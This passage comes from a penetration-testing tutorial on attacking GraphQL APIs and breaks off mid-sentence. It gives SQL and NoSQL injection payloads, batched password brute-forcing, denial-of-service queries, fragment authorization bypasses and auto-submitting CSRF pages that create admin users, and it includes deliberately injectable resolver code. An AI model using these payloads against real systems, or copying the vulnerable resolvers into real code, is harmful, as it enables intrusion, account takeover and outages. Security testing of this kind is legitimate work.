{"pageProps":{"postData":{"slug":"graphql-security-flaws","contentHtml":"\n<p><img src=\"/images/graphql-security.jpeg\" alt=\"GraphQL security vulnerabilities\"></p>\n<h2>Introduction</h2>\n<p>GraphQL has become the darling of modern API development, and for good reason. It solves many of the headaches that come with traditional REST APIs by letting clients ask for exactly what they need and nothing more. But with this flexibility comes a complex attack surface that most security teams aren't prepared to handle.</p>\n<p>I've been breaking GraphQL APIs for years, and what I've found is that the same features that make GraphQL powerful also make it dangerous. That nested query structure that developers love? It's perfect for DoS attacks. The schema introspection that makes integration so easy? It's a goldmine for attackers mapping your API. The flexible queries? They're a playground for injection attacks.</p>\n<p>In this article, I'll walk you through how to exploit GraphQL from the ground up. We'll start with basic reconnaissance techniques to map out an API, move on to common vulnerabilities like injection and broken authentication, and finish with advanced attack chains that combine multiple flaws for maximum impact. Everything here is based on real-world penetration tests I've conducted, with practical examples you can try yourself.</p>\n<h2>GraphQL Fundamentals</h2>\n<p>Before we start breaking things, let's understand what makes GraphQL different from the REST APIs you're used to attacking. GraphQL is essentially a query language for your API - it gives clients the power to ask for specific data in a specific format, all in a single request.</p>\n<p>A typical GraphQL implementation consists of a schema that defines what data is available, resolvers that fetch that data from various sources, and a single endpoint that handles all requests. Here's what a basic schema looks like:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">type User {\n  id: ID!\n  username: String!\n  email: String!\n  profile: Profile\n  posts: [Post!]\n}\n\ntype Profile {\n  id: ID!\n  firstName: String\n  lastName: String\n  address: String\n  phoneNumber: String\n  socialSecurityNumber: String\n}\n\ntype Post {\n  id: ID!\n  title: String!\n  content: String!\n  author: User!\n  comments: [Comment!]\n}\n\ntype Comment {\n  id: ID!\n  content: String!\n  author: User!\n}\n\ntype Query {\n  user(id: ID!): User\n  users: [User!]!\n  post(id: ID!): Post\n  posts: [Post!]!\n}\n\ntype Mutation {\n  createUser(username: String!, email: String!): User!\n  updateProfile(userId: ID!, firstName: String, lastName: String, address: String, phoneNumber: String): Profile!\n  createPost(title: String!, content: String!, authorId: ID!): Post!\n  deletePost(id: ID!): Boolean!\n}\n</code></pre>\n<p>The security issues with GraphQL stem from several key features:</p>\n<p>First, clients define their own queries. Unlike REST where the server dictates what data comes back for each endpoint, GraphQL lets clients specify exactly what fields they want - including fields they shouldn't have access to.</p>\n<p>Second, everything goes through a single endpoint. This means traditional security controls like per-endpoint rate limiting or access control don't work well. You need field-level security, which many implementations lack.</p>\n<p>Third, you can nest queries deeply. This can lead to exponential performance issues if you don't limit query depth. A single well-crafted query can bring down a server.</p>\n<p>Fourth, introspection lets clients query the schema itself. This is like giving attackers an API documentation that shows all the sensitive operations you support.</p>\n<p>Fifth, most GraphQL implementations support batching multiple operations in a single request. This is perfect for bypassing rate limits or brute-forcing credentials.</p>\n<p>Let me show you how to leverage these features to completely own a GraphQL API.</p>\n<h2>GraphQL Reconnaissance Techniques</h2>\n<p>The first phase of any GraphQL security assessment involves gathering information about the API structure. GraphQL's introspection feature makes this significantly easier than with REST APIs, allowing attackers to map out the entire API surface in minutes.</p>\n<h3>Leveraging Introspection</h3>\n<p>Introspection is a built-in GraphQL feature that allows clients to query the schema for information about available types, fields, queries, and mutations. While useful for development, it's a security liability in production environments.</p>\n<p>Here's how to perform a basic introspection query:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    subscriptionType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\n\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\n\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n</code></pre>\n<p>This verbose query returns detailed information about the entire schema, including:</p>\n<ul>\n<li>All available queries and mutations</li>\n<li>All defined types and their fields</li>\n<li>Relationships between types</li>\n<li>Argument requirements for each operation</li>\n</ul>\n<p>To perform this reconnaissance with Burp Suite:</p>\n<ol>\n<li>\n<p><strong>Set up your GraphQL request in Burp Repeater</strong>:</p>\n<ul>\n<li>Create a POST request to the GraphQL endpoint</li>\n<li>Set the Content-Type header to <code>application/json</code></li>\n<li>In the request body, include: <code>{\"query\": \"query { __schema { types { name kind fields { name } } } }\"}</code></li>\n<li>This simplified introspection query will list types and their fields</li>\n</ul>\n</li>\n<li>\n<p><strong>Analyze the introspection response</strong>:</p>\n<ul>\n<li>Send the request and analyze the JSON response</li>\n<li>Look for sensitive object types like <code>User</code>, <code>Admin</code>, <code>Token</code>, etc.</li>\n<li>Note fields with names suggesting sensitive data (password, token, secret)</li>\n</ul>\n</li>\n<li>\n<p><strong>Expand your reconnaissance</strong>:</p>\n<ul>\n<li>Once you have the type names, craft more specific introspection queries</li>\n<li>For example, to explore a specific type: <code>{\"query\": \"query { __type(name: \\\"User\\\") { name fields { name type { name kind ofType { name kind } } } } }\"}</code></li>\n</ul>\n</li>\n<li>\n<p><strong>Save findings in Burp</strong>:</p>\n<ul>\n<li>Use the \"Save\" feature in Burp Repeater to keep important responses for reference</li>\n<li>Create a separate request for each important schema component</li>\n</ul>\n</li>\n</ol>\n<h3>When Introspection is Disabled</h3>\n<p>Many production GraphQL APIs disable introspection as a security measure. However, this doesn't completely prevent reconnaissance. Several manual techniques can help map a GraphQL API without introspection:</p>\n<h4>1. Known query fuzzing with Burp Intruder</h4>\n<p>Since GraphQL operations follow predictable patterns, we can use Burp Intruder to fuzz the API with common query names:</p>\n<ol>\n<li>\n<p><strong>Create a base GraphQL query in Burp Repeater</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"query\": \"query { FUZZ { id } }\"}\n</code></pre>\n</li>\n<li>\n<p><strong>Send to Burp Intruder</strong>:</p>\n<ul>\n<li>Right-click and select \"Send to Intruder\"</li>\n<li>In the Positions tab, clear all automatically set positions</li>\n<li>Manually add the position markers around the field name: <code>{\"query\": \"query { §FUZZ§ { id } }\"}</code></li>\n</ul>\n</li>\n<li>\n<p><strong>Configure the payload</strong>:</p>\n<ul>\n<li>In the Payloads tab, set Payload type to \"Simple list\"</li>\n<li>Add common GraphQL query names to the list:\n<pre class=\"language-none\"><code class=\"language-none\">user\nusers\ngetUser\ngetUserById\ngetUserByEmail\nproduct\nproducts\ngetProduct\ngetProductById\npost\nposts\ngetPosts\ngetPostsByUser\norder\norders\ngetOrder\nlogin\nauthenticate\nsearch\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>Configure attack options</strong>:</p>\n<ul>\n<li>In the Options tab, set \"Grep - Match\" to look for patterns that indicate success</li>\n<li>Add patterns like \"data\", \"errors\", or specific error messages about arguments</li>\n</ul>\n</li>\n<li>\n<p><strong>Start the attack and analyze results</strong>:</p>\n<ul>\n<li>Launch the attack and review the results</li>\n<li>Look for responses that differ from the rest (different status code, length, or content)</li>\n<li>Valid fields will typically return specific errors about missing required arguments</li>\n</ul>\n</li>\n</ol>\n<h4>2. Error message analysis with Burp Repeater</h4>\n<p>GraphQL error messages are often verbose and reveal information about the schema. We can intentionally trigger errors to learn more about the API:</p>\n<ol>\n<li>\n<p><strong>Send an invalid query</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"query\": \"query { nonExistentField }\"}\n</code></pre>\n</li>\n<li>\n<p><strong>Analyze the error response</strong>:</p>\n<ul>\n<li>Look for \"Did you mean\" suggestions in error messages</li>\n<li>Check for field names mentioned in error context</li>\n<li>Note any schema information leaked in the error messages</li>\n</ul>\n</li>\n<li>\n<p><strong>Iterate based on error information</strong>:</p>\n<ul>\n<li>Use revealed field names to craft new queries</li>\n<li>Try variations of suggested field names</li>\n<li>Build up a schema map based on error information</li>\n</ul>\n</li>\n</ol>\n<h4>3. Alias enumeration with Burp Repeater</h4>\n<p>We can use GraphQL aliases to test multiple potential fields in a single query:</p>\n<ol>\n<li>\n<p><strong>Create an aliased query</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"query\": \"query { \n  a1: user { id name } \n  a2: users { id name }\n  a3: accounts { id name }\n  a4: customers { id name }\n}\"}\n</code></pre>\n</li>\n<li>\n<p><strong>Analyze the response</strong>:</p>\n<ul>\n<li>Valid fields will return data under their respective aliases</li>\n<li>Invalid fields will produce errors that can be matched to specific aliases</li>\n<li>Use this information to identify valid query fields</li>\n</ul>\n</li>\n</ol>\n<h3>Repository reconnaissance</h3>\n<p>For open source applications or those with public repositories, examining the codebase can reveal GraphQL schemas and resolvers:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># Search for GraphQL schema files in a GitHub repository\ngit clone https://github.com/target-organization/target-application.git\ncd target-application\ngrep -r \"type Query\" --include=\"*.graphql\" --include=\"*.js\" --include=\"*.ts\" .\ngrep -r \"extend type Query\" --include=\"*.graphql\" --include=\"*.js\" --include=\"*.ts\" .\ngrep -r \"gql\\`\" --include=\"*.js\" --include=\"*.ts\" .\n</code></pre>\n<p>Common files to look for include:</p>\n<ul>\n<li><code>schema.graphql</code> or <code>schema.gql</code></li>\n<li><code>*.typeDefs.js</code> or <code>*.typeDefs.ts</code></li>\n<li>JavaScript/TypeScript files with embedded GraphQL using tagged template literals</li>\n</ul>\n<h2>Exploiting GraphQL Vulnerabilities</h2>\n<p>Now that we understand how to map a GraphQL API, let's examine various attack vectors and exploitation techniques using Burp Suite.</p>\n<h3>Information Disclosure through Overfetching</h3>\n<p>Unlike REST APIs where each endpoint returns a fixed data structure, GraphQL allows clients to request exactly what they need. However, this flexibility means APIs that don't implement proper authorization checks at the field level can leak sensitive information.</p>\n<p>Consider this query:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query GetUserProfile {\n  user(id: \"1\") {\n    username\n    email\n    profile {\n      firstName\n      lastName\n      socialSecurityNumber  # Sensitive field!\n      dateOfBirth\n      phoneNumber\n    }\n  }\n}\n</code></pre>\n<p>If authorization is only checked at the operation level (can the user access <code>user</code>?) but not at the field level (can the user access <code>socialSecurityNumber</code>?), sensitive information could be exposed.</p>\n<p>Testing for overfetching vulnerabilities with Burp Repeater:</p>\n<ol>\n<li>\n<p><strong>Create a base query for a resource</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\nAuthorization: Bearer YOUR_TOKEN\n\n{\"query\": \"query { user(id: \\\"1\\\") { id username email } }\"}\n</code></pre>\n</li>\n<li>\n<p><strong>Incrementally add potentially sensitive fields</strong>:</p>\n<ul>\n<li>Start with fields that are likely to exist but not shown in the UI</li>\n<li>Add fields like <code>password</code>, <code>resetToken</code>, <code>role</code>, <code>permissions</code>, etc.</li>\n<li>Try nested fields like <code>profile { socialSecurityNumber }</code></li>\n</ul>\n</li>\n<li>\n<p><strong>Analyze responses for sensitive data exposure</strong>:</p>\n<ul>\n<li>Look for fields that return actual values instead of null or errors</li>\n<li>Compare the results with what's available in the application UI</li>\n<li>Note any sensitive data that shouldn't be accessible to your user role</li>\n</ul>\n</li>\n</ol>\n<p>This manual approach allows you to carefully analyze each response and detect subtle information leakage.</p>\n<h3>GraphQL Injection</h3>\n<p>GraphQL is vulnerable to injection attacks similar to SQL injection. These occur when user-supplied input is not properly sanitized before being used in resolver functions.</p>\n<h4>SQL Injection via GraphQL</h4>\n<p>Consider a resolver implemented like this in Node.js:</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">const resolvers = {\n  Query: {\n    user: async (_, { username }) => {\n      // VULNERABILITY: Directly interpolating user input into SQL query\n      const query = `SELECT * FROM users WHERE username = '${username}'`;\n      return await db.raw(query);\n    }\n  }\n};\n</code></pre>\n<p>This resolver is vulnerable to SQL injection. An attacker could exploit it with a query like:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query {\n  user(username: \"admin' OR 1=1 --\") {\n    id\n    username\n    email\n  }\n}\n</code></pre>\n<p>At the database level, this would execute:</p>\n<pre class=\"language-sql\"><code class=\"language-sql\">SELECT * FROM users WHERE username = 'admin' OR 1=1 --'\n</code></pre>\n<p>The <code>OR 1=1</code> condition ensures the query returns all users, potentially leaking information about other accounts.</p>\n<p>Testing for SQL injection in GraphQL with Burp Suite:</p>\n<ol>\n<li>\n<p><strong>Identify injectable parameters</strong>:</p>\n<ul>\n<li>Create a request in Burp Repeater targeting a GraphQL query that accepts user input</li>\n<li>Example: <code>{\"query\": \"query { user(username: \\\"admin\\\") { id username email } }\"}</code></li>\n</ul>\n</li>\n<li>\n<p><strong>Test for SQL injection with Burp Repeater</strong>:</p>\n<ul>\n<li>Modify the parameter to include SQL injection payloads:\n<ul>\n<li><code>{\"query\": \"query { user(username: \\\"admin' OR 1=1 --\\\") { id username email } }\"}</code></li>\n<li><code>{\"query\": \"query { user(username: \\\"admin\\\\\\\" OR \\\\\\\"1\\\\\\\"=\\\\\\\"1\\\") { id username email } }\"}</code></li>\n<li><code>{\"query\": \"query { user(username: \\\"' UNION SELECT 1,username,password FROM users --\\\") { id username email } }\"}</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>Use Burp Intruder for systematic testing</strong>:</p>\n<ul>\n<li>Send your request to Intruder</li>\n<li>Set the position around the injection point: <code>{\"query\": \"query { user(username: \\\"§admin§\\\") { id username email } }\"}</code></li>\n<li>Use a list of SQL injection payloads from Burp's built-in payload options</li>\n<li>Add grep match rules to identify successful injections (look for multiple records, error messages, etc.)</li>\n</ul>\n</li>\n<li>\n<p><strong>Analyze the results</strong>:</p>\n<ul>\n<li>Look for responses with different lengths or content</li>\n<li>Check for database error messages that leak information</li>\n<li>Verify if any payloads return more data than expected (indicating successful injection)</li>\n</ul>\n</li>\n</ol>\n<h4>NoSQL Injection</h4>\n<p>GraphQL APIs built on NoSQL databases like MongoDB are vulnerable to NoSQL injection attacks:</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">// Vulnerable resolver using MongoDB\nconst resolvers = {\n  Query: {\n    user: async (_, { username }) => {\n      // VULNERABILITY: Directly using user input in query object\n      return await UserCollection.findOne({ username: username });\n    }\n  }\n};\n</code></pre>\n<p>If the input isn't properly validated, an attacker could send:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query {\n  user(username: {$ne: null}) {\n    id\n    username\n    email\n  }\n}\n</code></pre>\n<p>In MongoDB, this would translate to finding a user where the username is not equal to null—essentially returning the first user in the database.</p>\n<p>Testing for NoSQL injection with Burp Suite:</p>\n<ol>\n<li>\n<p><strong>Create a base request in Burp Repeater</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"query\": \"query { user(username: \\\"admin\\\") { id username email } }\"}\n</code></pre>\n</li>\n<li>\n<p><strong>Test NoSQL operator injections</strong>:</p>\n<ul>\n<li>Replace the parameter value with NoSQL operators:\n<ul>\n<li><code>{\"query\": \"query { user(username: {\\\"$ne\\\": null}) { id username email } }\"}</code></li>\n<li><code>{\"query\": \"query { user(username: {\\\"$regex\\\": \\\"^adm\\\"}) { id username email } }\"}</code></li>\n<li><code>{\"query\": \"query { user(username: {\\\"$gt\\\": \\\"\\\"}) { id username email } }\"}</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>Use Burp Intruder for more comprehensive testing</strong>:</p>\n<ul>\n<li>Set up positions around the parameter value</li>\n<li>Use a list of NoSQL injection payloads</li>\n<li>Configure grep match rules to identify successful injections</li>\n</ul>\n</li>\n<li>\n<p><strong>Analyze results</strong>:</p>\n<ul>\n<li>Look for responses that return data when they shouldn't</li>\n<li>Check for different error messages that reveal information about the database</li>\n<li>Verify if operators like <code>$ne</code> or <code>$regex</code> work, indicating NoSQL injection vulnerabilities</li>\n</ul>\n</li>\n</ol>\n<h3>Batching Attacks</h3>\n<p>GraphQL allows sending multiple operations in a single request, which can be abused for various attacks:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">[\n  { \n    \"query\": \"query { user(id: \\\"1\\\") { id username } }\"\n  },\n  {\n    \"query\": \"query { user(id: \\\"2\\\") { id username } }\"\n  },\n  {\n    \"query\": \"query { user(id: \\\"3\\\") { id username } }\"\n  }\n  // ... hundreds more queries\n]\n</code></pre>\n<p>This can be used for:</p>\n<ol>\n<li><strong>Rate limit bypass</strong>: If rate limiting is implemented per-request rather than per-operation</li>\n<li><strong>Brute force attacks</strong>: Testing many different values in a single request</li>\n<li><strong>Resource exhaustion</strong>: Overwhelming the server with many operations</li>\n</ol>\n<p>Testing batching attacks with Burp Suite:</p>\n<ol>\n<li>\n<p><strong>Create a batch request template in Burp Repeater</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n[\n  {\"query\": \"query { user(id: \\\"1\\\") { id username } }\"},\n  {\"query\": \"query { user(id: \\\"2\\\") { id username } }\"}\n]\n</code></pre>\n</li>\n<li>\n<p><strong>Testing rate limit bypass</strong>:</p>\n<ul>\n<li>Add more queries to the batch to see if you can make more queries than normally allowed</li>\n<li>Monitor for rate limit error messages</li>\n<li>If no errors occur, the API may be vulnerable to rate limit bypassing</li>\n</ul>\n</li>\n<li>\n<p><strong>Brute force attacks with Burp Intruder</strong>:</p>\n<ul>\n<li>For password brute forcing, create a batch template like:\n<pre class=\"language-none\"><code class=\"language-none\">[\n  {\"query\": \"mutation { login(username: \\\"admin\\\", password: \\\"§password§\\\") { token } }\"},\n  {\"query\": \"mutation { login(username: \\\"admin\\\", password: \\\"§password2§\\\") { token } }\"},\n  {\"query\": \"mutation { login(username: \\\"admin\\\", password: \\\"§password3§\\\") { token } }\"}\n]\n</code></pre>\n</li>\n<li>Send to Intruder and configure Cluster Bomb attack type</li>\n<li>Set payloads for each position from your password list</li>\n<li>Configure grep patterns to identify successful logins</li>\n</ul>\n</li>\n<li>\n<p><strong>Resource exhaustion testing</strong>:</p>\n<ul>\n<li>Create a batch with increasingly complex or numerous queries</li>\n<li>Monitor server response times and errors</li>\n<li>Gradually increase the load until you observe performance degradation</li>\n</ul>\n</li>\n</ol>\n<h3>Denial of Service (DoS) Attacks</h3>\n<p>GraphQL's flexibility makes it particularly vulnerable to DoS attacks. Let's examine how to test these using Burp Suite:</p>\n<h4>Nested Query Attacks</h4>\n<p>GraphQL allows deeply nested queries that can cause exponential performance degradation:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query NestedFriends {\n  user(id: \"1\") {\n    friends {\n      friends {\n        friends {\n          friends {\n            friends {\n              friends {\n                # And so on...\n    name\n    email\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n</code></pre>\n<p>If each user has multiple friends, this query can cause an exponential explosion in the number of resolver executions, similar to the classic billion laughs XML attack.</p>\n<p>Testing for nested query vulnerabilities with Burp Repeater:</p>\n<ol>\n<li>\n<p><strong>Create a base query with a potential cyclic relationship</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"query\": \"query { user(id: \\\"1\\\") { friends { name } } }\"}\n</code></pre>\n</li>\n<li>\n<p><strong>Incrementally add nesting levels and observe response times</strong>:</p>\n<ul>\n<li>Add one level of nesting at a time</li>\n<li>Measure the response time for each level</li>\n<li>Look for exponential increases in response time</li>\n</ul>\n</li>\n<li>\n<p><strong>Find the breaking point</strong>:</p>\n<ul>\n<li>Continue adding nesting levels until:\n<ul>\n<li>The request times out</li>\n<li>The server returns an error</li>\n<li>The response time becomes unreasonably long</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>Document your findings</strong>:</p>\n<ul>\n<li>Note the nesting level where performance degrades significantly</li>\n<li>Record the response time pattern (linear vs. exponential growth)</li>\n<li>Save the query that demonstrates the vulnerability</li>\n</ul>\n</li>\n</ol>\n<h4>Field Duplication Attacks</h4>\n<p>Another DoS technique involves duplicating fields many times:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query DuplicatedFields {\n  user(id: \"1\") {\n    username\n    email\n    username\n    email\n    username\n    email\n    # Repeated thousands of times\n  }\n}\n</code></pre>\n<p>Some GraphQL implementations process each field instance separately, causing performance issues with enough duplication.</p>\n<p>Testing field duplication with Burp Repeater:</p>\n<ol>\n<li>\n<p><strong>Create a base query in Burp Repeater</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"query\": \"query { user(id: \\\"1\\\") { username email } }\"}\n</code></pre>\n</li>\n<li>\n<p><strong>Use Burp's text editor to duplicate fields</strong>:</p>\n<ul>\n<li>Copy and paste the fields multiple times</li>\n<li>Start with 10 duplications, then 100, then 1000, etc.</li>\n<li>Observe the response time for each test</li>\n</ul>\n</li>\n<li>\n<p><strong>Create a request that triggers the vulnerability</strong>:</p>\n<ul>\n<li>Find the number of duplications that causes significant slowdown</li>\n<li>Document the performance impact</li>\n</ul>\n</li>\n</ol>\n<h4>Resource-Intensive Operations</h4>\n<p>Attackers can target resource-intensive operations within the API:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query ExpensiveOperations {\n  searchProducts(query: \"a\") {\n    # Full-text search operation\n    id\n    name\n    price\n  }\n  \n  geoSearch(lat: 37.7749, lng: -122.4194, radius: 100) {\n    # Geospatial search operation\n    id\n    name\n    distance\n  }\n}\n</code></pre>\n<p>By combining multiple expensive operations or using very permissive search parameters, attackers can overload the server.</p>\n<p>Testing resource-intensive operations with Burp Repeater:</p>\n<ol>\n<li>\n<p><strong>Identify potentially expensive operations</strong>:</p>\n<ul>\n<li>Look for operations involving:\n<ul>\n<li>Search functionality</li>\n<li>Filtering large datasets</li>\n<li>Geospatial queries</li>\n<li>Data aggregation</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>Test with Burp Repeater using minimal parameters</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"query\": \"query { searchProducts(query: \\\"\\\") { id name description } }\"}\n</code></pre>\n</li>\n<li>\n<p><strong>Modify parameters to maximize resource usage</strong>:</p>\n<ul>\n<li>Use very broad search terms (\"a\", \"e\", etc.)</li>\n<li>Request large result sets</li>\n<li>Combine multiple resource-intensive operations in one query</li>\n</ul>\n</li>\n<li>\n<p><strong>Measure and document the impact</strong>:</p>\n<ul>\n<li>Note response times</li>\n<li>Watch for server errors or timeouts</li>\n<li>Identify operations that cause the most significant performance degradation</li>\n</ul>\n</li>\n</ol>\n<h3>Authorization Bypass</h3>\n<p>GraphQL has unique authorization challenges due to its flexible query structure. Here's how to test for these issues with Burp Suite:</p>\n<h4>Object-Level vs. Field-Level Authorization</h4>\n<p>Many GraphQL implementations check authorization at the object level but not at the field level:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query {\n  # Authorized at object level\n  currentUser {\n    username\n    email\n    # Field-level authorization missing\n    role\n    permissions\n  }\n}\n</code></pre>\n<p>If the API only checks whether the user can access the <code>currentUser</code> object but doesn't verify access to specific fields like <code>role</code> or <code>permissions</code>, sensitive data might be exposed.</p>\n<p>Testing field-level authorization with Burp Repeater:</p>\n<ol>\n<li>\n<p><strong>Authenticate with different user accounts</strong>:</p>\n<ul>\n<li>Create users with different permission levels (admin, regular user, etc.)</li>\n<li>Obtain authorization tokens for each user</li>\n</ul>\n</li>\n<li>\n<p><strong>Create a query that requests sensitive fields</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\nAuthorization: Bearer REGULAR_USER_TOKEN\n\n{\"query\": \"query { currentUser { username email role permissions adminSettings } }\"}\n</code></pre>\n</li>\n<li>\n<p><strong>Analyze the response</strong>:</p>\n<ul>\n<li>Check if sensitive fields are returned despite insufficient privileges</li>\n<li>Note which fields are properly protected and which are not</li>\n</ul>\n</li>\n<li>\n<p><strong>Compare with admin-level access</strong>:</p>\n<ul>\n<li>Switch the token to an admin user</li>\n<li>Run the same query and compare results</li>\n<li>Document any fields that should only be visible to admins but are exposed to regular users</li>\n</ul>\n</li>\n</ol>\n<h4>Unauthorized Mutations via Fragments</h4>\n<p>Fragment abuse can sometimes bypass authorization:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">mutation {\n  updateUser(id: \"1\", input: {\n    email: \"hacker@evil.com\"\n  }) {\n    ...AdminFields\n  }\n}\n\nfragment AdminFields on User {\n  id\n  role\n}\n</code></pre>\n<p>If the API doesn't properly check authorization for fragment fields separately from the main query, an attacker might gain access to restricted data.</p>\n<p>Testing fragment-based authorization bypass with Burp Repeater:</p>\n<ol>\n<li>\n<p><strong>Identify a mutation that returns user data</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\nAuthorization: Bearer USER_TOKEN\n\n{\"query\": \"mutation { updateUser(id: \\\"1\\\", input: { name: \\\"Test User\\\" }) { id name } }\"}\n</code></pre>\n</li>\n<li>\n<p><strong>Add a fragment requesting sensitive fields</strong>:</p>\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\nAuthorization: Bearer USER_TOKEN\n\n{\"query\": \"mutation { updateUser(id: \\\"1\\\", input: { name: \\\"Test User\\\" }) { id name ...AdminFields } } fragment AdminFields on User { role permissions adminSettings }\"}\n</code></pre>\n</li>\n<li>\n<p><strong>Analyze the response</strong>:</p>\n<ul>\n<li>Check if the fragment fields are returned despite insufficient privileges</li>\n<li>Verify if authorization checks handle fragments properly</li>\n</ul>\n</li>\n</ol>\n<h3>CSRF Vulnerabilities in GraphQL</h3>\n<p>Cross-Site Request Forgery (CSRF) vulnerabilities occur when GraphQL endpoints don't properly verify that requests are intentional. Unlike traditional REST APIs where each endpoint can have its own CSRF protection, GraphQL typically uses a single endpoint for all operations, complicating CSRF defenses.</p>\n<h4>CSRF via GET Requests</h4>\n<p>While GraphQL operations are typically submitted via POST requests, some implementations also support GET requests with the query in URL parameters:</p>\n<pre class=\"language-none\"><code class=\"language-none\">https://api.example.com/graphql?query=mutation{createUser(username:\"malicious\",role:\"admin\"){id}}\n</code></pre>\n<p>If the API accepts GET requests and relies solely on cookies for authentication, it may be vulnerable to CSRF attacks. An attacker could create a malicious website that triggers this request:</p>\n<pre class=\"language-html\"><code class=\"language-html\">&#x3C;img src=\"https://api.example.com/graphql?query=mutation{createUser(username:'attacker',role:'admin'){id}}\" style=\"display:none\">\n</code></pre>\n<p>When a victim with an active session visits this page, their browser automatically includes their authentication cookies, potentially executing the mutation.</p>\n<p>Testing for GET-based CSRF with Burp Repeater:</p>\n<ol>\n<li>\n<p><strong>Test if GET requests are supported</strong>:</p>\n<ul>\n<li>Create a simple GraphQL query in Burp Repeater</li>\n<li>Convert it from POST to GET by moving the query to URL parameters:\n<pre class=\"language-none\"><code class=\"language-none\">GET /graphql?query=query{__typename} HTTP/1.1\nHost: example.com\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>Test mutations via GET</strong>:</p>\n<ul>\n<li>If GET requests work, try a mutation via GET:\n<pre class=\"language-none\"><code class=\"language-none\">GET /graphql?query=mutation{createUser(username:\"test\",role:\"user\"){id}} HTTP/1.1\nHost: example.com\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>Create a CSRF PoC HTML page</strong>:</p>\n<ul>\n<li>If mutations via GET work, create a simple HTML page:\n<pre class=\"language-html\"><code class=\"language-html\">&#x3C;!DOCTYPE html>\n&#x3C;html>\n&#x3C;body>\n  &#x3C;h1>Test Page&#x3C;/h1>\n  &#x3C;img src=\"https://api.example.com/graphql?query=mutation{createUser(username:'csrf_test',role:'admin'){id}}\" style=\"display:none\">\n&#x3C;/body>\n&#x3C;/html>\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>Test the PoC</strong>:</p>\n<ul>\n<li>Save the HTML to a file</li>\n<li>Open it in a browser where you have an active session with the target site</li>\n<li>Check if the mutation executes successfully</li>\n</ul>\n</li>\n</ol>\n<p>For POST-based CSRF, you can test with a more sophisticated HTML form that submits automatically:</p>\n<pre class=\"language-html\"><code class=\"language-html\">&#x3C;!DOCTYPE html>\n&#x3C;html>\n&#x3C;body onload=\"document.forms[0].submit()\">\n  &#x3C;form action=\"https://api.example.com/graphql\" method=\"POST\" enctype=\"text/plain\">\n    &#x3C;input name='{\"query\":\"mutation{createUser(username:' value='\"csrf_test\",role:\"admin\"){id}}\"}' type=\"hidden\">\n  &#x3C;/form>\n&#x3C;/body>\n&#x3C;/html>\n</code></pre>\n<h2>Advanced Attack Scenarios</h2>\n<p>Let's explore some complex attack chains that combine multiple GraphQL 